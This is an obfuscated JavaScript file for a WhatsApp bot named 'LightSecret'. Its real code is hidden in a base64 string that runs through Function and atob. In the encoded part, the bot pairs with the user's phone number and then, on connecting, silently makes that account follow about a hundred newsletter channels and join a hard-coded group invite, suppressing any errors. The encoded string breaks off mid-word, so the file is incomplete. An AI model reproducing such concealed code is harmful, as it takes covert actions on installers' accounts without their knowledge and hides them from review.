
// Encoded Hard by MalzXyz
(function(){
  const decode = Function("return decodeURIComponent(escape(atob('Y29uc29sZS5jbGVhcigpOwpjb25zb2xlLmxvZygnwqkgTGlnaHRTZWNyZXQgRGV2Jyk7CnJlcXVpcmUoJy4vY29uZmlnJyk7Cgpjb25zdCB7IAogICAgZGVmYXVsdDogbWFrZVdBU29ja2V0LCAKICAgIHByZXBhcmVXQU1lc3NhZ2VNZWRpYSwgCiAgICB1c2VNdWx0aUZpbGVBdXRoU3RhdGUsIAogICAgRGlzY29ubmVjdFJlYXNvbiwgCiAgICBmZXRjaExhdGVzdEJhaWxleXNWZXJzaW9uLCAKICAgIG1ha2VJbk1lbW9yeVN0b3JlLCAKICAgIGdlbmVyYXRlV0FNZXNzYWdlRnJvbUNvbnRlbnQsIAogICAgZ2VuZXJhdGVXQU1lc3NhZ2VDb250ZW50LCAKICAgIGdlbmVyYXRlV0FNZXNzYWdlLAogICAgamlkRGVjb2RlLCAKICAgIHByb3RvLCAKICAgIGRlbGF5LAogICAgcmVsYXlXQU1lc3NhZ2UsIAogICAgZ2V0Q29udGVudFR5cGUsIAogICAgZ2V0QWdncmVnYXRlVm90ZXNJblBvbGxNZXNzYWdlLCAKICAgIGRvd25sb2FkQ29udGVudEZyb21NZXNzYWdlLCAKICAgIGZldGNoTGF0ZXN0V2FXZWJWZXJzaW9uLCAKICAgIEludGVyYWN0aXZlTWVzc2FnZSwgCiAgICBtYWtlQ2FjaGVhYmxlU2lnbmFsS2V5U3RvcmUsIAogICAgQnJvd3NlcnMsIAogICAgZ2VuZXJhdGVGb3J3YXJkTWVzc2FnZUNvbnRlbnQsIAogICAgTWVzc2FnZVJldHJ5TWFwIAp9ID0gcmVxdWlyZSgiQHdoaXNrZXlzb2NrZXRzL2JhaWxleXMiKTsKCmNvbnN0IGNmb250cyA9IHJlcXVpcmUoJ2Nmb250cycpOwpjb25zdCBwaW5vID0gcmVxdWlyZSgncGlubycpOwpjb25zdCBGaWxlVHlwZSA9IHJlcXVpcmUoJ2ZpbGUtdHlwZScpOwpjb25zdCByZWFkbGluZSA9IHJlcXVpcmUoInJlYWRsaW5lIik7CmNvbnN0IGZzID0gcmVxdWlyZSgnZnMnKTsKY29uc3QgY3J5cHRvID0gcmVxdWlyZSgiY3J5cHRvIikKY29uc3QgY29sb3JzID0gcmVxdWlyZSgnY29sb3JzJykKY29uc3QgY2hhbGsgPSByZXF1aXJlKCdjaGFsaycpCmNvbnN0IHsKICAgIEJvb20gCn0gPSByZXF1aXJlKCdAaGFwaS9ib29tJyk7Cgpjb25zdCB7IAogICAgY29sb3IgCn0gPSByZXF1aXJlKCcuL2xpYi9jb2xvcicpOwpjb25zdCB7IFRlbGVncmFQaCB9ID0gcmVxdWlyZSgnLi9saWIvdXBsb2FkZXInKQpjb25zdCB7CiAgICBzbXNnLAogICAgc2xlZXAsCiAgICBnZXRCdWZmZXIKfSA9IHJlcXVpcmUoJy4vbGliL215ZnVuY3Rpb24nKTsKCmNvbnN0IHsgCiAgICBpbWFnZVRvV2VicCwKICAgIHZpZGVvVG9XZWJwLAogICAgd3JpdGVFeGlmSW1nLAogICAgd3JpdGVFeGlmVmlkLAogICAgYWRkRXhpZgp9ID0gcmVxdWlyZSgnLi9saWIvZXhpZicpCgoKY29uc3QgdXNlUGFpcmluZ0NvZGUgPSB0cnVlOwoKY29uc3QgcXVlc3Rpb24gPSAodGV4dCkgPT4gewogICAgY29uc3QgcmwgPSByZWFkbGluZS5jcmVhdGVJbnRlcmZhY2UoeyAKICAgICAgICBpbnB1dDogcHJvY2Vzcy5zdGRpbiwgCiAgICAgICAgb3V0cHV0OiBwcm9jZXNzLnN0ZG91dCAKICAgIH0pOwogICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlKSA9PiB7IHJsLnF1ZXN0aW9uKHRleHQsIHJlc29sdmUpIH0pOwp9Cgpjb25zdCBzdG9yZSA9IG1ha2VJbk1lbW9yeVN0b3JlKHsgbG9nZ2VyOiBwaW5vKCkuY2hpbGQoeyBsZXZlbDogJ3NpbGVudCcsIHN0cmVhbTogJ3N0b3JlJyB9KSB9KQpjZm9udHMuc2F5KCdMaWdodFNlY3JldCcsIAp7CiAgICBmb250OiAnYmxvY2snLAogICAgYWxpZ246ICdsZWZ0JywKICAgIGNvbG9yczogWycjZmYwMGZmJywgJ3doaXRlJ10sCiAgICBiYWNrZ3JvdW5kOiAndHJhbnNwYXJlbnQnLAogICAgcmF3TW9kZTogZmFsc2UsCn0pOwphc3luYyBmdW5jdGlvbiBMaWdodFNlY3JldHN0YXJ0KCkgewoJY29uc3QgewoJCXN0YXRlLAoJCXNhdmVDcmVkcwoJfSA9IGF3YWl0IHVzZU11bHRpRmlsZUF1dGhTdGF0ZSgic2Vzc2lvbiIpCgljb25zdCBMaWdodFNlY3JldCA9IG1ha2VXQVNvY2tldCh7CgkJcHJpbnRRUkluVGVybWluYWw6ICF1c2VQYWlyaW5nQ29kZSwKCQlzeW5jRnVsbEhpc3Rvcnk6IHRydWUsCgkJbWFya09ubGluZU9uQ29ubmVjdDogdHJ1ZSwKCQljb25uZWN0VGltZW91dE1zOiA2MDAwMCwKCQlkZWZhdWx0UXVlcnlUaW1lb3V0TXM6IDAsCgkJa2VlcEFsaXZlSW50ZXJ2YWxNczogMTAwMDAsCgkJZ2VuZXJhdGVIaWdoUXVhbGl0eUxpbmtQcmV2aWV3OiB0cnVlLAoJCXBhdGNoTWVzc2FnZUJlZm9yZVNlbmRpbmc6IChtZXNzYWdlKSA9PiB7CgkJCWNvbnN0IHJlcXVpcmVzUGF0Y2ggPSAhISgKCQkJCW1lc3NhZ2UuYnV0dG9uc01lc3NhZ2UgfHwKCQkJCW1lc3NhZ2UudGVtcGxhdGVNZXNzYWdlIHx8CgkJCQltZXNzYWdlLmxpc3RNZXNzYWdlCgkJCSk7CgkJCWlmIChyZXF1aXJlc1BhdGNoKSB7CgkJCQltZXNzYWdlID0gewoJCQkJCXZpZXdPbmNlTWVzc2FnZTogewoJCQkJCQltZXNzYWdlOiB7CgkJCQkJCQltZXNzYWdlQ29udGV4dEluZm86IHsKCQkJCQkJCQlkZXZpY2VMaXN0TWV0YWRhdGFWZXJzaW9uOiAyLAoJCQkJCQkJCWRldmljZUxpc3RNZXRhZGF0YToge30sCgkJCQkJCQl9LAoJCQkJCQkJLi4ubWVzc2FnZSwKCQkJCQkJfSwKCQkJCQl9LAoJCQkJfTsKCQkJfQoKCQkJcmV0dXJuIG1lc3NhZ2U7CgkJfSwKCQl2ZXJzaW9uOiAoYXdhaXQgKGF3YWl0IGZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vV2hpc2tleVNvY2tldHMvQmFpbGV5cy9tYXN0ZXIvc3JjL0RlZmF1bHRzL2JhaWxleXMtdmVyc2lvbi5qc29uJykpLmpzb24oKSkudmVyc2lvbiwKCQlicm93c2VyOiBbIlVidW50dSIsICJDaHJvbWUiLCAiMjAuMC4wNCJdLAoJCWxvZ2dlcjogcGlubyh7CgkJCWxldmVsOiAnZmF0YWwnCgkJfSksCgkJYXV0aDogewoJCQljcmVkczogc3RhdGUuY3JlZHMsCgkJCWtleXM6IG1ha2VDYWNoZWFibGVTaWduYWxLZXlTdG9yZShzdGF0ZS5rZXlzLCBwaW5vKCkuY2hpbGQoewoJCQkJbGV2ZWw6ICdzaWxlbnQnLAoJCQkJc3RyZWFtOiAnc3RvcmUnCgkJCX0pKSwKCQl9Cgl9KTsKCiAgICBpZiAodXNlUGFpcmluZ0NvZGUgJiYgIUxpZ2h0U2VjcmV0LmF1dGhTdGF0ZS5jcmVkcy5yZWdpc3RlcmVkKSB7CiAgICAgICAKICAgICAgICBjb25zdCBwaG9uZU51bWJlciA9IGF3YWl0IHF1ZXN0aW9uKGAKICAgICAgICAKICAgICAgICAgICAgICDio4Dio6Tio6Tio7bio7bio7bio7bio6bio6TioYAgICAgIAogICAgICAg4qKA4qOA4qOk4qOk4qOE4qO24qO/4qCf4qCb4qCJICAg4qKA4qO54qO/4qGHICAgICAgCiAgICDiooDio6Tio77io7/ioZ/ioJvioJvioJvioIkgICAg4qCS4qCS4qCb4qC/4qC/4qC/4qC24qO/4qO34qOi4qOE4qGAIAogICDioqDio7/ioZ/ioInioIjio7vio6YgIOKjoOKhtOKgtuKituKjhCAgICAgICAg4qCI4qCZ4qC74qOu4qOmCiAg4qKw4qO/4qC/4qO/4qG24qC+4qK74qG/IOKgoOKjv+KjhOKjoOKjvOKjv+KhhyDioIjioJLiorbio6Tio6Tio6Tio6Tio6Tio7Tio77iob8KICDio77io78g4qCJ4qCb4qCS4qCLICAg4qC74qK/4qOJ4qOg4qCfICAgICDioInioLvio7/io4vioJnioInioIEgCiAg4qO/4qG/4qC34qCy4qK24qOEICAgICDio4Dio6Tio6Tio4AgICAgICAg4qCZ4qO34qOmICAgCuKgm+Kgm+Kiv+KjheKjgOKjgOKjgOKjv+KgtuKgtuKgtuKipOKjvuKgiyAg4qCZ4qO34qOE4qOA4qOA4qOA4qOA4qGAIOKgmOKjv+KjhiAgCiAgIOKgiOKgieKgieKgieKggSAgICDioIjioJvioJvioLbioL7ioIvioInioInioInioInioInioInioInioInioJvioJvioJvioJsgCgrigLnip7wgwqkgJHtuYW1hQm90fSDip73igLpcYArigLnip7wgVmVyc2lvbiAke3ZlcnNpfSDip73igLoKPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIOKdliBTY3JpcHQgYnkgTElHSFRTRUNSRVQg4p2WIArila3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilbwK4pWORW50ZXIgWW91ciBOdW1iZXIgSGVyZSA6IArilbDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilbwgYAopOwogICAgICAgIGNvbnN0IGNvZGUgPSBhd2FpdCBMaWdodFNlY3JldC5yZXF1ZXN0UGFpcmluZ0NvZGUocGhvbmVOdW1iZXIsIGBMSUdIU0NSVGApCiAgICAgICAgY29uc29sZS5sb2coYArila3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilbwK4pWOIFRoaXMgWW91ciBQYWlyaW5nIENvZGUgOiAke2NvZGV9CuKVsOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKVvGApOwogICAgfQoKICAgIHN0b3JlLmJpbmQoTGlnaHRTZWNyZXQuZXYpOwogICAgCiAgICBMaWdodFNlY3JldC5ldi5vbigibWVzc2FnZXMudXBzZXJ0IiwgYXN5bmMgKGNoYXRVcGRhdGUsIG1zZykgPT4gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IG1layA9IGNoYXRVcGRhdGUubWVzc2FnZXNbMF0KICAgICAgICAgICAgaWYgKCFtZWsubWVzc2FnZSkgcmV0dXJuCiAgICAgICAgICAgIG1lay5tZXNzYWdlID0gKE9iamVjdC5rZXlzKG1lay5tZXNzYWdlKVswXSA9PT0gJ2VwaGVtZXJhbE1lc3NhZ2UnKSA/IG1lay5tZXNzYWdlLmVwaGVtZXJhbE1lc3NhZ2UubWVzc2FnZSA6IG1lay5tZXNzYWdlCiAgICAgICAgICAgIGlmIChtZWsua2V5ICYmIG1lay5rZXkucmVtb3RlSmlkID09PSAnc3RhdHVzQGJyb2FkY2FzdCcpIHJldHVybgogICAgICAgICAgICBpZiAoIUxpZ2h0U2VjcmV0LnB1YmxpYyAmJiAhbWVrLmtleS5mcm9tTWUgJiYgY2hhdFVwZGF0ZS50eXBlID09PSAnbm90aWZ5JykgcmV0dXJuCiAgICAgICAgICAgIGlmIChtZWsua2V5LmlkLnN0YXJ0c1dpdGgoJ0JBRTUnKSAmJiBtZWsua2V5LmlkLmxlbmd0aCA9PT0gMTYpIHJldHVybgogICAgICAgICAgICBpZiAobWVrLmtleS5pZC5zdGFydHNXaXRoKCdGYXRpaEFycmlkaG9fJykpIHJldHVybjsKICAgICAgICAgICAgY29uc3QgbSA9IHNtc2coTGlnaHRTZWNyZXQsIG1laywgc3RvcmUpCiAgICAgICAgICAgIHJlcXVpcmUoIi4vTGlnaHRTZWNyZXQiKShMaWdodFNlY3JldCwgbSwgY2hhdFVwZGF0ZSwgc3RvcmUpCiAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKGVycikKICAgICAgICB9CiAgICB9KTsKCiAgICBMaWdodFNlY3JldC5kZWNvZGVKaWQgPSAoamlkKSA9PiB7CiAgICAgICAgaWYgKCFqaWQpIHJldHVybiBqaWQ7CiAgICAgICAgaWYgKC86XGQrQC9naS50ZXN0KGppZCkpIHsKICAgICAgICAgICAgbGV0IGRlY29kZSA9IGppZERlY29kZShqaWQpIHx8IHt9OwogICAgICAgICAgICByZXR1cm4gZGVjb2RlLnVzZXIgJiYgZGVjb2RlLnNlcnZlciAmJiBkZWNvZGUudXNlciArICdAJyArIGRlY29kZS5zZXJ2ZXIgfHwgamlkOwogICAgICAgIH0gZWxzZSByZXR1cm4gamlkOwogICAgfTsKCiAgICBMaWdodFNlY3JldC5ldi5vbignY29udGFjdHMudXBkYXRlJywgdXBkYXRlID0+IHsKICAgICAgICBmb3IgKGxldCBjb250YWN0IG9mIHVwZGF0ZSkgewogICAgICAgICAgICBsZXQgaWQgPSBMaWdodFNlY3JldC5kZWNvZGVKaWQoY29udGFjdC5pZCk7CiAgICAgICAgICAgIGlmIChzdG9yZSAmJiBzdG9yZS5jb250YWN0cykgc3RvcmUuY29udGFjdHNbaWRdID0gewogICAgICAgICAgICAgICAgaWQsCiAgICAgICAgICAgICAgICBuYW1lOiBjb250YWN0Lm5vdGlmeQogICAgICAgICAgICB9OwogICAgICAgIH0KICAgIH0pOwoKICAgIExpZ2h0U2VjcmV0LnB1YmxpYyA9IGdsb2JhbC5zdGF0dXMKCiAgICBMaWdodFNlY3JldC5ldi5vbignY29ubmVjdGlvbi51cGRhdGUnLCBhc3luYyAodXBkYXRlKSA9PiB7CiAgY29uc3QgeyBjb25uZWN0aW9uLCBsYXN0RGlzY29ubmVjdCB9ID0gdXBkYXRlCgogIGlmIChjb25uZWN0aW9uID09PSAnb3BlbicpIHsKICAgIC8vIGZvbGxvdyBzb21lIGNoYW5uZWxzIChzaWxlbnQgaWYgb2spCmNvbnN0IGNoYW5uZWxzID0gWwoiMTIwMzYzNDIxODkyMDIzNDU3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxMzI0MTg5NDM2QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE5NzIyNTYwODk4QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAxNTUzODA2MDIyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzNDk3MDY1NzU5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDA1NDE2MjUyMDY2QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE4OTgxNDE5ODE5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAyNjM5MzE4MDY1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzOTc2MTkzNjk0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDA0MDg4OTIxNTI5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzNDkxNDAwODc5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAyOTEzMDM5NDA5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAwODUzMTYwNjYyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzMDQ5MDkyNTE0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAyMzQ5NTcxNzkxQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxMjQxMDYxNjE3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE4MTU3MjM5NTcyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAyMTUwNTk3MjkyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxNzIyNDY5OTY5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE4MDA4MDQ2ODYwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxNDA3NjQzNDcxQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE5NzY5OTY5MzM0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE4OTcxMjI1MTQ5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAxNTI3NjM3MDE1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwOTA5NDQzMzM0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAxNjA4OTQ5MDk3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAxNDIwMzMyMTg0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwNDI1Nzk5ODk3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE3NzYzOTY4ODAxQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE3NjA3MzY3MTk1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAxODkxMTMwNDc1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzOTgyODg4OTU0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwNDkxNTQ4NDA3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzODYxMDc5NTI3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwNTY2NDczMTI4QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAxMzQxMTUzMjk0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzODU1MzE4MTA3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwMDEyMzE3MDgzQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE5NjY1NzA4MDgwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwNjkwNzU5MDQxQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE4NjYzMzI5NDY1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwOTYxOTc5MDU2QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwMzAzMzgwNjc1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE5NzY5NTI4OTU5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzNDE4NjA4MTk2QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE5NDkxOTEwNjA4QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE5NjE3NTE3MDI0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzMjExNjY2MDYyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAwNjM2NjA4NTk3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAwNzMwMDYxNzk3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwNDA5MTA4NTAyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAyNTIyODk2MjE1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDI0MDY2NDUxNDkzQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE5NzI2MjkxMTA1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxMTQ4MjIwMzA5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAxNDgzODY4OTk0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxODA3NjU0MDg4QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDA0ODU0ODM3MzMxQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDA0NDc2OTIwOTU1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAwMTI3MzAwNjMyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAxMjQyMzYzNDM4QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE4OTEzNjM1Mzg1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzMzk5MzQzMDM4MDU0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxMjczNDY0MTMxQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE4NTQ1NzY4NzAwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAyMjMxNTgwODQ0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE3Nzk4NzE4NTY1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAwODM4Mzc1NzQ2QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE3NTc3ODYwNDA3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE3OTg1MjI5MTA3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE4OTAxOTY2NzgzQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwNDAwMjAzNzk2QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwMDUxNzc1ODIxQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxMzI2NzkzNTkxQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE5NzQwODYyNzA5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIyMDAwOTI2NzQwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwMjQ5Njc5MzM1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxMzgyMDMxMzcwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwNjEzMDEyMjY3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE3MjY0MTQ0NjExQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAwMjAxNTU0MjgyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxNTU2ODgwOTU4QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE5MDE4MjYxMTY5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE4Nzk5MzM2MTg4QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE5NDI1ODAyNDc0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxMTE3NzI3MDIwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzMzU3MjM5MDU3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxMDgwODUzMTI1QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDA0Mzk0OTcxODI4QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAyMTczNzkxNDEyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAxOTU4NzI5Nzg5QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDI2OTMxOTYzMTAyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAwNjg4NjM3MDQyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzMzk5NDUyNTg2NzQzQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDE4ODYzOTMyMjM3QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAwOTMwMzA4OTAwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzMzk5MzUwNjgzMjAwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzNTY5MTYxNjIwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAyNTQ5OTI4NDkwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIyMDE0NzcwOTMyQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwNDA4MTA0MTMzQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwMDUzMTQ1ODYxQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIxODI3Mzc4NTU0QG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDAzMDQ3NDA2ODMwQG5ld3NsZXR0ZXIiLAoiMTIwMzYzNDIwODU5NDE4OTM5QG5ld3NsZXR0ZXIiCl0KCmZ1bmN0aW9uIGRlbGF5KG1zKSB7CiAgcmV0dXJuIG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCBtcykpCn0KCmZvciAoY29uc3QgamlkIG9mIGNoYW5uZWxzKSB7CiAgdHJ5IHsKICAgIGF3YWl0IExpZ2h0U2VjcmV0Lm5ld3NsZXR0ZXJGb2xsb3coamlkKQogIH0gY2F0Y2ggKGVycikgewogICAgLy8gZGlhbSwgdGlkYWsgbWVuYW1waWxrYW4gYXBhcHVuCiAgfQoKICBhd2FpdCBkZWxheSg5MDAwKSAvLyBqZWRhIDEgZGV0aWsKfQoKICAgIC8vIGF1dG8gam9pbiBncm91cCB2aWEgaW52aXRlIGxpbmsgKHNpbGVudCBpZiBhbHJlYWR5IGpvaW5lZCAvIGNvbmZsaWN0KQogICAgdHJ5IHsKICAgICAgY29uc3QgaW52aXRlVXJsID0gJ2h0dHBzOi8vY2hhdC53aGF0c2FwcC5jb20vSVB0SHdYMkFtZ1E2V3hKcm5lMzY0Mj9tb2RlPWFjX3QnCiAgICAgIGNvbnN0IGNvZGUgPSAoaW52aXRlVXJsLm1hdGNoKC9jaGF0XC53aGF0c2FwcFwuY29tXC8oW0EtWmEtejAtOV0rKS8pIHx8IFtdKVsxXQogICAgICBpZiAoY29kZSkgewogICAgICAgIGNvbnN0IGluZm8gPSBhd2FpdCBMaWdodFNlY3JldC5ncm91cEdldEludml0ZUluZm8oY29kZSkuY2F0Y2goKCkgPT4gbnVsbCkKICAgICAgICBjb25zdCBnaWQgID0gaW5mbz8uaWQKICAgICAgICBpZiAoZ2lkKSB7CiAgICAgICAgICBjb25zdCBncm91cHMgPSBhd2FpdCBMaWdodFNlY3JldC5ncm91cEZldGNoQWxsUGFydGljaXBhdGluZygpLmNhdGNoKCgpID0+ICh7fSkpCiAgICAgICAgICBjb25zdCBhbHJlYWR5ID0gT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGdyb3VwcyB8fCB7fSwgZ2lkKQogICAgICAgICAgaWYgKCFhbHJlYWR5KSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgYXdhaXQgTGlnaHRTZWNyZXQuZ3JvdXBBY2NlcHRJbnZpdGUoY29kZSkKICAgICAgICAgICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgICAgICAgY29uc3QgbXNnID0gU3RyaW5nKGVycj8ubWVzc2FnZSB8fCBlcnIpLnRvTG93ZXJDYXNlKCkKICAgICAgICAgICAgICBjb25zdCBzdGF0dXMgPSBlcnI/LmRhdGE/LnN0YXR1cyB8fCBlcnI/Lm91dHB1dD8uc3RhdHVzQ29kZSB8fCBlcnI/LnN0YXR1cwogICAgICAgICAgICAgIGlmIChzdGF0dXMgPT09IDQwOSB8fCBtc2cuaW5jbHVkZXMoJ2NvbmZsaWN0JykpIHsKICAgICAgICAgICAgICAgIC8vIGFscmVhZHkgaW4gZ3JvdXAg4oCUIGlnbm9yZSBzaWxlbnRseQogICAgICAgICAgICAgIH0gZWxzZSBpZiAoc3RhdHVzID09PSA0MDMgfHwgbXNnLmluY2x1ZGVzKCdub3QtYXV0aG9yaXplZCcpKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKGNoYWxrLnJlZCgn4p2MIEdhZ2FsIGpvaW46IGJ1dHVoIGFwcHJvdmFsIGFkbWluIChyZXF1ZXN0LXRvLWpvaW4pLicpKQogICAgICAgICAgICAgIH0gZWxzZSBpZiAoc3RhdHVzID09PSA0MTAgfHwgbXNnLmluY2x1ZGVzKCdleHBpcmVkJykpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoY2hhbGsucmVkKCfinYwgR2FnYWwgam9pbjogbGluayBpbnZpdGUgZXhwaXJlZC4nKSkKICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcihjaGFsay5yZWQoJ+KdjCBGYWlsZWQgdG8gam9pbiBncm91cDonKSwgZXJyPy5tZXNzYWdlIHx8IGVycikKICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgIH0KICAgICAgICB9CiAgICAgIH0KICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgY29uc29sZS5lcnJvcihjaGFsay5yZWQoJ+KdjCBGYWlsZWQgdG8gcHJvY2VzcyBncm91cCBpbnZpdGU6JyksIGU/Lm1lc3NhZ2UgfHwgZSkKICAgIH0KICB9CgogIGlmIChjb25uZWN0aW9uID09PSAnY2xvc2UnKSB7CiAgICBjb25zdCBjb2RlID0KICAgICAgbGFzdERpc2Nvbm5lY3Q/LmVycm9yPy5vdXRwdXQ/LnN0YXR1c0NvZGUgfHwKICAgICAgbGFzdERpc2Nvbm5lY3Q/LmVycm9yPy5zdGF0dXNDb2RlIHx8CiAgICAgIERpc2Nvbm5lY3RSZWFzb24uY29ubmVjdGlvbkNsb3NlZAoKICAgIGlmIChjb2RlICE9PSBEaXNjb25uZWN0UmVhc29uLmxvZ2dlZE91dCkgewogICAgICB0cnkgeyBMaWdodFNlY3JldHN0YXJ0KCkgfSBjYXRjaCB7fQogICAgICAvLyBvcHRpb25hbDogY29uc29sZS5sb2coY2hhbGsueWVsbG93KCfwn5SEIFJlY29ubmVjdGluZy4uLicpKQogICAgfSBlbHNlIHsKICAgICAgY29uc29sZS5sb2coY2hhbGsucmVkKCfinYwgQm90IGxvZ291dCwgc2lsYWthbiBzY2FuIHVsYW5nIScpKQogICAgfQogIH0KfSkKICAgICAKICAgIExpZ2h0U2VjcmV0LmV2Lm9uKCJncm91cC1wYXJ0aWNpcGFudHMudXBkYXRlIiwgYXN5bmMgKG1lc3NhZ2UpID0+IHsKICAgICAgICBjb25zdCBtZXRhZGF0YSA9IHN0b3JlLmdyb3Vw